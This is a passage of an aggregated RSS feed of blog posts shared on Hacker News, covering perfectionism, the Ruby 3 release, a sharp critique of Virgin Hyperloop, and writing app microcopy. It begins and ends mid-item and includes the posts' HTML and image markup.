data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The result is a kind of min-max of approach to life: If you can’t excel, don’t bother spending time on it.</p>
<p>That’s not necessarily a bad thing!</p>
<p>However, we don’t always have control. In my nonprofit communications career, I sometimes got assigned to write press releases on topics that *might* get attention, but which seemed not newsworthy to me. It may have still been worth the few hours of my time in case it grabbed a reporter’s eye. It was important to keep my job. But I had so. much. trouble. getting myself to do the work.</p>
<p>Even in the personal realm, picking up a new hobby is made difficult. If it doesn’t seem like you’re going to be amazing at it, the hobby as a whole loses its luster.</p>
<hr>
<p><strong>What’s helped me: </strong>A big problem for me has been overlooking the benefits gained from so-called “failure”. Once I start to factor in e.g. how much I expect to learn (so that I can do better in the future) I end up feeling much better about giving things a shot.</p>
<hr>
<h3>Why procrastination (and anxiety) are common</h3>
<p>At a granular scale, the problem becomes worse. Rather than “How good do I expect to feel at the end of this?” our emotional reaction is probably trained by the in-the-moment “How much happier do I expect to feel as a result of one more bit of work?”</p>
<p>In other words, we can view the derivative/slope of these graphs as motivation:</p>
<p><img data-attachment-id="2367" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/motivationcurves/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=1198%2C608&amp;ssl=1" data-orig-size="1198,608" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="MotivationCurves" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=630%2C320&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;ssl=1" alt="MotivationCurves" width="630" height="320" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>With a perfectionist mindset, the bigger and further away a goal is, the more difficult it will be to feel motivated in the moment.&nbsp; For much of the time, we’re trying to push ourselves to work without getting any internal positive reinforcement.</p>
<p>This is a particular issue in the Effective Altruism movement where the goal is to *checks notes* Save the World. Also, to (“Figure out how to do the most good, and then do it.”)</p>
<p>It’s true that as a perfectionist nears their goal, they’re extremely motivated! But that also means that the stakes are very high for every decision and every action.&nbsp; …Which is a recipe for anxiety. Terrific.</p>
<hr>
<p><strong>What’s helped me: </strong>To the extent that I can, I find that breaking tasks into pieces helps. If I think of my goal as “Save the World”, another day of work won’t feel very important. But a goal of “Finish reading another research paper” is something I can make real progress on in a day!</p>
<hr>
<h2>All models are wrong, but some are useful</h2>
<p>This framework isn’t perfect. Neither is this writeup. (I’m hyper-aware.) But this idea has been in my head, in my drafts folder, and unfinished for months. Rather than give in to the sense that I “should” keep working on it, I’m going to try following my own advice. I’m remembering that:</p>
<ul>
<li>I’ve clarified my thinking a ton by writing everything down.</li>
<li>The consequences of a sloppy post in are minimal in the big scheme of things.</li>
<li>This isn’t supposed to be my final conclusion – it’s one step on the path</li>
</ul>
<p>Even if it’s not perfect, perhaps the current iteration of this framework can help you understand me, yourself, or perfectionists in your life.</p>
<p>I used to have this “DONE IS BETTER THAN PERFECT” poster draped over a chair in my office. I never got around to hanging it up, but honestly? It seems better that way.</p>
<p><img data-attachment-id="2366" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/poster/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=720%2C1276&amp;ssl=1" data-orig-size="720,1276" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Poster" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=169%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=578%2C1024&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;ssl=1" alt="Poster" width="250" height="443" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<h2>Articles/books I found helpful:</h2>
<p><a title="The-Perfectionist-Script-for-self-defeat" href="https://jessegalef.com/wp-content/uploads/2020/08/the-perfectionist-script-for-self-defeat.pdf">The-Perfectionist-Script-for-self-defeat</a> by David Burns (pdf)</p>
<p><a href="https://www.amazon.com/dp/B005ZE5AT2/" target="_blank" rel="noopener">When Perfect Isn’t Good Enough</a> by&nbsp;<span><span>Martin M. Antony&nbsp;&amp;</span><span><span>&nbsp;</span></span></span><span>Richard P. Swinson</span></p>
<p><a href="https://www.amazon.com/dp/B06XCY97JT/" target="_blank" rel="noopener">Mastering the Art of Quitting</a> by Peg Streep &amp; Alan Bernstein</p>
<p><a href="https://www.amazon.com/dp/B00475ARKC/" target="_blank" rel="noopener">Better By Mistake</a> by Alina Tugend</p>
<p><a href="https://www.amazon.com/dp/B003ZSHUP2/" target="_blank" rel="noopener">The Procrastination Equation</a> by Piers Steel</p>

					
					<!--
					<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:identifier="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:title="A Pretty-Good Mathematical Model of Perfectionism"
    trackback:ping="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/trackback/" />
</rdf:RDF>					-->

				</div></div>]]>
            </description>
            <link>https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088396</guid>
            <pubDate>Fri, 13 Nov 2020 22:37:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Release of Ruby 3 Will Be Monumental]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25088015">thread link</a>) | @tomashertus
<br/>
November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>
</div></div>]]>
            </description>
            <link>https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088015</guid>
            <pubDate>Fri, 13 Nov 2020 21:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hyperloop’s Only Destination Is a Capitalist Hellscape]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 84 (<a href="https://news.ycombinator.com/item?id=25087782">thread link</a>) | @xdze2
<br/>
November 13, 2020 | https://discourseblog.com/hyperloop-test-virgin-scam/ | <a href="https://web.archive.org/web/*/https://discourseblog.com/hyperloop-test-virgin-scam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Back in 2016 and 2017, one of the key components of mainstream tech coverage was something referred to as “vaporware“1: flashy, futuristic tech whose supposed potential often overshadowed its practicality or even, you know, actual existence in the real world. </p>



<p>This was a strange time in technology and tech journalism, one <a href="https://discourseblog.com/elon-musk-made-me-a-socialist/">I’ve written about at length before</a>. Uber did a whole <a href="https://www.theverge.com/2017/11/8/16613228/uber-flying-car-la-nasa-space-act">summit on how it was going to build flying cars,</a> self-driving technology was assumed to be right around the corner, and editors commissioned endless stories about <a href="https://www.mercurynews.com/2016/07/09/hacking-the-brain-silicon-valley-entrepreneurs-turn-to-fasting-and-smart-drugs/">“biohacking”</a> and <a href="https://www.bbc.com/news/technology-34210012">“transhumanism.”</a> One of the most interesting, most hyped, and most wildly impractical technologies from this era was the hyperloop. </p>



<p>I’m not going to go into huge detail on the hyperloop’s origin story, other than to say it owes its current popularity to the incredibly stupid personality cult surrounding Elon Musk. The technology is relatively easy to understand: you put a vehicle on a track inside a vacuum-sealed tube and it goes very fast. </p>



<p>The hilariously named Virgin Hyperloop2 passed a huge milestone this week when its first two passengers went down its 500-meter tube at a little over 100mph.3 The company celebrated the achievement by releasing a modest video comparing it to, among other things, the moment the Wright Brothers flew the first planes.</p>



<figure></figure>



<p>The core difference of the “hyperloop” versus, say, a train, is that the passenger-carrying vehicle inside the vacuum tube is not susceptible to air resistance, and can therefore attain speeds that are largely impossible or unsafe for an external train. However, as you can imagine, the logistics of building a perfectly vacuum-sealed tube big enough to carry a magnetic levitation vehicle are significantly more difficult than, say, building a train track (even a magnetic levitation one). </p>



<p>And as <a href="https://twitter.com/leftistthot420/status/1326559165838487552?s=20">many</a> <a href="https://twitter.com/hilaryagro/status/1326531535223345153?s=20">people</a> <a href="https://twitter.com/jkass99/status/1326607439240679424?s=20">pointed out</a> online, focusing on this kind of technology rather than, say, <em>trains</em>, is insanely stupid because we already have trains that are way better than this. We—by which I mean America— just don’t want to spend the money to build them. </p>



<figure></figure>



<p>Hyperloop is, in this context, the perfect example of the end-state death-cult capitalism that the American ruling class believes in. Virgin Hyperloop has raised some $400 million so far according to the <a href="https://www.nytimes.com/2020/11/08/business/virgin-hyperloop-passenger-test.html"><em>New York Times</em> story on the test</a>, which is half just a press release and then two interviews with experts saying “this shit won’t work, why are they doing this.” $400 million is a drop in the bucket compared to what it would cost to build an actual functioning high-speed rail network across the country.4</p>



<p>What hyperloop <em>does</em> do, however, is let the powers that be point to flashy efforts to make a cool technology real, like when Trump’s Transportation Secretary Elaine Chao5 <a href="https://www.mhlnews.com/transportation-distribution/article/22055573/dot-wants-to-weigh-in-on-emerging-transportation-technology">created</a> the Non-Traditional and Emerging Transportation Technology (NETT) Council to basically remove any federal regulation that would stop people flooding money into this shit.</p>



<p>Despite how all this sounds, I’m ultimately not a pessimist on the hyperloop as a whole. I think that worldwide mass transit is eventually going to need some kind of system that replaces air travel, which is extraordinarily energy-inefficient and currently relies entirely on fossil fuels to make it work. Ground transportation is largely restricted in speed by friction and air resistance, two things that a vacuum-sealed hyperloop system removes.6 I think eventually, a global network of 500 mph + transport technology might be feasible, but this is like 2200 tech we’re talking about, not 2020. Until then, we have trains. Trains that work, trains that can work even better, trains that are <em>incredibly efficient at moving goods, services, and people long distances and are relatively easy to power with non-fossil-fuel sources because they’re on static tracks. </em>Trains are good! </p>



<p>But this is America, and we cannot have nice things. Creating a nationwide high-speed rail service would cost money and political capital, and doing it right would require it to be a largely publicly-funded and administered project. Hyperloop, however, is marketing itself to the highest bidder: there’s a reason that the first contracts its various scammy companies sold were to do things like <a href="https://www.bbc.com/news/technology-49096675">connecting Riyadh to Jeddah in Saudi Arabia</a>.  </p>



<p>The core deceit of all of these technologies, from hyperloop to flying cars to neural nets, is that they will demonstrably improve everyday people’s lives at some point in their lifetimes. What the founders do is say “this is coming in 2020,” in 2016, and by 2020 they’re a bit behind schedule, but look, they have a flashy test to show you. The technology is coming soon, they promise. And when it gets here, when they “make it a reality,” to paraphrase almost every article written about vaporware, your life will get better. Only the tech never comes. And when it does, you won’t be able to afford it. It’s entirely possible that in our lifetimes the oil and gas billionaires in Saudi Arabia will be able to shoot themselves in tiny designer-branded pods with heated leather seats from one side of the Kingdom to the other. Maybe we’ll even have a line in the U.S. that Wall Street execs and DC lobbyists will use to blast up and down the Eastern Seaboard for business lunches. But you and me? We’ll be stuck on dilapidated Amtrak lines, no matter how many press tours Joe Biden takes on them, eating Cup Noodles from the dining car, or else stuck in our cars, choking the sky with emissions from the gas that we can barely afford to buy, stuck in traffic on roads falling further and further into disrepair, our only consolation the fact that the hyperloop’s vacuum-sealed tubes don’t have windows, so its riders won’t be able to gawk or gloat as they fly by at 800 miles per hour. </p>



<hr>



<ol><li><em>For an absolutely excellent breakdown of what vaporware and tech like it is, watch <a href="https://www.youtube.com/watch?v=4dn6ZVpJLxs">engineering YouTuber donoteat01’s video on a related idea</a>, Elon Musk’s “Loop” system. He uses the term “Fucking Magic,” rather than vaporware, which is more fun to say honestly. </em></li><li><em>As an aside, Virgin Hyperloop is the like fifth corporate incarnation of a company called Hyperloop One that was founded by a bunch of tech dorks including a man named, I shit you not, Brogan BamBrogan, who later left the company to start his own hyperloop company because his co-founders allegedly put an alleged noose on his desk during some kind of internal conflict that I refuse to re-familiarize myself with but that you can read about here in a <a href="https://www.inverse.com/article/18194-the-8-wildest-takeaways-from-bambrogan-s-hyperloop-one-lawsuit">listicle that I edited in 2016</a>.</em></li><li><em>Guess they can’t call it a virgin anymore ha ha ha ha. </em></li><li><em>Probably in the hundreds of billions if not trillions I honestly have no idea but it’s not cheap. Seth Moulton put forth <a href="https://www.globalrailwayreview.com/news/100907/plans-investment-us-high-speed-rail/">a $240 billion plan</a> a few years ago but I think that’s a little low. </em></li><li><em>Chao is also Mitch McConnell’s wife. </em></li><li><em>People actually figured this out in the 1800s when they used <a href="https://www.newstatesman.com/future-proof/2013/12/londons-victorian-hyperloop-forgotten-pneumatic-railway-beneath-capitals-street">pneumatic tubes to shoot mail and cargo all over London.</a> </em></li></ol>
</div></div></div></div></div>]]>
            </description>
            <link>https://discourseblog.com/hyperloop-test-virgin-scam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087782</guid>
            <pubDate>Fri, 13 Nov 2020 21:35:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Copy, Big Impact]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25086825">thread link</a>) | @wallflower
<br/>
November 13, 2020 | https://steamclock.com/blog/2020/10/microcopy/ | <a href="https://web.archive.org/web/*/https://steamclock.com/blog/2020/10/microcopy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Page body">

        



<section id="archive">

    
    
    <div>

        <p><span><span></span></span> Allen Pike • October 19, 2020</p>

        

        <article>
            <p>At Steamclock, we’re firm believers in the power of microcopy: the tiny phrases that lead customers through your app. Product design is all about communication, and an extremely cost-effective way to make your app communicate better – and thus retain, convert, and delight better – is to refine your microcopy.</p>

<p><img src="https://steamclock.com/img/posts/microcopy@2x.png" alt="Two Spies goes to great lengths to keep its tutorial text concise."></p>
<blockquote>
  <p>Two Spies goes to great lengths to keep its tutorial text concise.</p>
</blockquote>

<p>A key part of launching any new app is triaging and prioritizing common and high-impact user feedback. A couple years back we launched a finance app that was well received by users, but one of the most common complaints was people reporting that they couldn’t see their transaction history.</p>

<p>The thing was, we did have a transaction history feature – and as far as we could tell it was working. Pretty quickly we tracked the issue down to the fact that the server was only returning 3 months of data, which wasn’t enough for accounts that were used infrequently and thus had no recent transactions.</p>

<p>Naturally, we prioritized getting the server team to add support for longer-term transaction data. However, this turned out to be a bit involved, and it would take some time before it was implemented. In the meantime, “My transactions aren’t loading” continued to be one of the most common types of feedback we received.</p>

<p>Knowing microcopy is one of the fastest ways to improve UX, we loaded up the app and reviewed our message for when there were no recent transactions. We brought up one such test account, and the app dutifully reported:</p>

<p>“<strong>There are no transactions yet.</strong>”</p>

<p>But that wasn’t quite true, at least not in this case. This is a really common microcopy problem: the message implied that missing data didn’t exist, but it did – it had just been filtered out. We soon pushed an update for this case that explained much more clearly:</p>

<p>“<strong>No transactions from the last 3 months.</strong>”</p>

<p>Just like that, the complaints stopped. We went from receiving frequent annoyed reports that transactions were broken, to occasional kind suggestions that it would be nice if people could see more than 3 months of transactions. Everybody rejoiced.</p>

<h3 id="improving-your-labels">Improving your labels</h3>

<p>While this was an extremely easy UX win, it takes time and attention to write and maintain descriptive and context-aware messages. First, you need a product team with a fairly deep understanding of the product and how users think about it, enough that they can recognize opportunities to refine the copy. User testing is of course very helpful here.</p>

<p>You also need a shared understanding that brief, succinct text is worth the extra effort. Every extra label and word is a potential distraction and will discourage people from actually reading your copy.</p>

<p>More subtly though, context-specific microcopy needs some ongoing maintenance to ensure it stays accurate. When our client’s server team later added support for more than 3 months of transactions, we needed to coordinate with them to update the corresponding message in app. When coordination like this is impractical or unlikely to happen seamlessly, a more generic message can work. We could alternatively have just said “No recent transactions”, which isn’t as helpful to users but is less likely to “break”.</p>

<p>On the whole, iteratively refining and improving the messaging in your product is a great investment. While larger and more mature products often have a “growth team” that looks at microcopy as it relates to onboarding users and driving upgrades, anybody on your product team can have a positive impact just by spending a little bit of time thinking about what messages and button titles users are being shown. Having a product team that’s encouraged to use, think about, and really <em>try</em> the product is a big part of building something special.</p>

<p>We need to be exercising our apps not just from a functionality perspective, but from a perspective that asks, “What do people think when they see this? Will they actually read all of this?”</p>

<p>Bonus points if you actually ask them!</p>

<h3 id="8-starting-points-for-refining-your-apps-microcopy">8 starting points for refining your app’s microcopy</h3>

<ul>
  <li>What are some user behaviours you wish happened more often?</li>
  <li>What are frequent points of confusion? How do first-time users get exposed to those failure points in the app?</li>
  <li>How would a user who is aggressively skimming your app’s interface – not reading more than 6 words in a row – experience your onboarding process?</li>
  <li>How could some explanations or messages be more succinct?</li>
  <li>Are there features or actions that are underused because they’re worded in a non-obvious or unappealing way?</li>
  <li>Are there verbs that could be more thoughtfully named? Is there any generic “Continue” or “OK” buttons that could be clearer or more compelling?</li>
  <li>Is it possible to reduce the length of your onboarding or “tour” and sprinkle “just in time” messages and hints in the right places instead?</li>
  <li>Review a portion of your app’s errors and feedback messages, asking yourself for each message if it’s actually always true in the cases where that message is shown.</li>
</ul>


        </article>

        

        <div>

            <p><span><span><!--?xml version="1.0" encoding="UTF-8"?-->
<svg width="218px" height="50px" viewBox="0 0 218 50" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <title>Steamclock Software</title>
    <desc>Steamclock is a web and mobile software studio based in downtown Vancouver. We make great apps for iOS, Android, and the web.</desc>
    <defs>
        <path d="M71.213593,20.9625922 C72.4992306,20.9625922 73.3869621,20.6244828 73.3869621,19.610331 C73.3869621,18.5652975 72.1930679,18.2273646 70.6626055,17.7662581 C68.2445873,17.0593341 65.3365682,16.1681793 65.3365682,12.4800336 C65.3365682,9.37599138 67.8466812,7.47050826 71.2441741,7.47050826 C73.3869621,7.47050826 75.2847496,7.71650228 77.121199,8.82276952 L75.8968994,11.9883985 C74.5806806,11.3737664 73.2644619,11.0663621 71.6728372,11.0663621 C70.5402809,11.0663621 69.6219684,11.404295 69.6219684,12.4186233 C69.6219684,13.4327752 70.7545246,13.7708846 72.4686495,14.2626962 C74.9785868,14.9696202 77.7335246,15.8914801 77.7335246,19.3643369 C77.7335246,22.8064886 75.3766687,24.435449 71.6420803,24.435449 C68.8567371,24.435449 66.7447061,23.9438139 65,22.8987805 L66.1631374,19.7024464 C67.8466812,20.5016622 69.6219684,20.9625922 71.213593,20.9625922 Z M84.7118567,24.7427474 C81.7122699,23.0523767 81.2836068,19.7025169 81.2836068,16.6290034 L81.2836068,11.1585481 L78.9265752,11.1585481 L78.9265752,7.83921695 L81.2836068,7.83921695 L81.2836068,3.22921131 L85.7526695,2.67616592 L85.7526695,7.83921695 L89.0890002,7.83921695 L88.6912698,11.1585481 L85.7526695,11.1585481 L85.7526695,16.7212953 C85.7526695,19.1800002 86.211738,20.9933679 87.7116192,22.652857 L84.7118567,24.7427474 Z M97.9658755,24.435449 C93.0377444,24.435449 90.2216444,22.3455586 90.2216444,16.0144771 C90.2216444,9.46810679 93.0989067,7.47050826 97.5066314,7.47050826 C101.853194,7.47050826 104.454874,9.13017382 104.454874,17.0593341 L94.8436127,18.0734859 C95.1190186,20.0405558 96.037507,20.8088901 97.9045375,20.8088901 C99.5880813,20.8088901 101.087963,20.4707806 102.649006,19.5487442 L103.995806,22.6529629 C102.2511,23.851522 100.322731,24.435449 97.9658755,24.435449 Z M100.108488,14.3855167 C100.04715,11.9883985 99.159594,11.0663621 97.5066314,11.0663621 C95.639425,11.0663621 94.6599502,12.234216 94.6599502,14.7852129 L94.6599502,15.2461429 L100.108488,14.3855167 Z M117.402941,24.4047968 C117.096954,23.6364625 116.821373,22.8065415 116.63771,22.0075021 C115.749979,23.5134655 114.372598,24.435502 111.954404,24.435502 C107.883423,24.435502 106.291623,22.4686086 106.291623,19.4259766 C106.291623,16.2603476 108.18941,14.5699769 115.994804,14.109047 C115.872479,11.7731625 114.709342,11.1892356 112.933879,11.1892356 C111.403416,11.1892356 109.872954,11.5889317 108.464816,12.2956793 L107.118192,9.00722975 C109.04656,7.90078604 111.219754,7.4705612 113.637948,7.4705612 C117.892591,7.4705612 120.463866,9.99067644 120.463866,13.8630529 L120.463866,17.8584265 C120.463866,19.7332044 120.494623,21.7000978 120.892354,23.5441707 L117.402941,24.4047968 Z M115.994804,17.059387 C112.138066,17.2744995 110.760685,17.9507183 110.760685,19.2722745 C110.760685,20.4708336 111.342078,20.9626452 113.08696,20.9626452 C114.617423,20.9626452 115.382829,20.1327241 115.994804,18.811168 L115.994804,17.059387 Z M142.747279,24.0666874 L142.747279,15.1231988 C142.747279,12.357266 142.226873,11.1278253 140.543329,11.1278253 C139.012867,11.1278253 138.339555,11.7731625 137.666067,13.0333084 L137.666067,24.0666874 L133.197004,24.0666874 L133.197004,13.52512 C133.197004,12.0805668 132.462354,11.1278253 130.99323,11.1278253 C129.462592,11.1278253 128.789279,11.7731625 128.115967,13.0333084 L128.115967,24.0666874 L123.646905,24.0666874 L123.646905,14.0474602 C123.646905,12.1726822 123.616148,10.2057889 123.218417,8.36171602 L126.70783,7.50126634 C127.013817,8.26960061 127.289398,9.09934516 127.473061,9.89838457 C128.330211,8.39259762 129.677011,7.4705612 132.095205,7.4705612 C134.819386,7.4705612 136.257929,8.5461233 136.961998,10.0213816 C137.819148,8.39259762 139.22711,7.4705612 141.645129,7.4705612 C146.787503,7.4705612 147.216342,11.1892356 147.216342,14.5085667 L147.216342,24.0666874 L142.747279,24.0666874 Z M157.531339,24.4354843 C152.05222,24.4354843 149.879027,21.7307853 149.879027,15.9529257 C149.879027,10.1750661 152.05222,7.47054355 157.531339,7.47054355 C159.306802,7.47054355 160.898426,7.74706625 162.275807,8.57698726 L160.837264,11.8654368 C159.857614,11.3736252 158.725057,11.1278076 157.531339,11.1278076 C154.837739,11.1278076 154.378671,12.9102937 154.378671,15.9529257 C154.378671,18.9955577 154.837739,20.7780438 157.531339,20.7780438 C158.725057,20.7780438 159.857614,20.5322262 160.837264,20.0405911 L162.275807,23.3290406 C160.898426,24.1589616 159.306802,24.4354843 157.531339,24.4354843 Z M171.886595,15.9529433 C171.886595,10.1750837 174.059964,7.4705612 179.539082,7.4705612 C185.018025,7.4705612 187.191395,10.1750837 187.191395,15.9529433 